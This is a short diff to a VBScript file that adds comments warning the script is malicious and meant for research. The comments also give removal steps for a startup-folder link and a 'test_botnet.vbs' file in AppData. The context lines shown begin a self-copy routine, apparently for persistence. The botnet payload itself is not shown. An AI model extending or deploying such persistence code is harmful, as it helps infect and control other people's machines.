@@ -1,3 +1,9 @@
+' WARNING: THE FOLLOWING SCRIPT IS MALICIOUS AND POTENTIALLY DANGEROUS
+' IT IS INTENDED FOR RESEARCH PURPOSES ONLY. RUN AT YOUR OWN RISK
+
+' Removal: delete the link in your startup folder and delete the file
+' named test_botnet.vbs from AppData\Roaming\Microsoft
+
 Set objShell = CreateObject("WScript.Shell")
 strScriptPath = WScript.ScriptFullName
 strAppDataDir = objShell.ExpandEnvironmentStrings("%AppData%")
